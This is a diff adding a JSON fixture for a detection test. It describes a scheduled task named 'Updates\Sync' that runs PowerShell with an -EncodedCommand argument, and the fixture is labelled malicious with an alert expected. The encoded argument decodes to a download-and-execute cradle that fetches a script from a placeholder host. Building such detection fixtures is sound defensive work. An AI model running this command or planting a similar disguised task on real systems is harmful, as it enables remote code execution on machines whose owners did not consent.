@@ -1,0 +1,8 @@
+{
+  "label": "malicious",
+  "source": "Microsoft about_PowerShell_exe -EncodedCommand + Sigma SQBFAFgA marker",
+  "TaskName": "\\\\Updates\\\\Sync",
+  "TaskExecCommand": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+  "TaskExecArguments": "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1AC8AYQAuAHAAcwAxACcAKQA=",
+  "expect_alert": true
+}
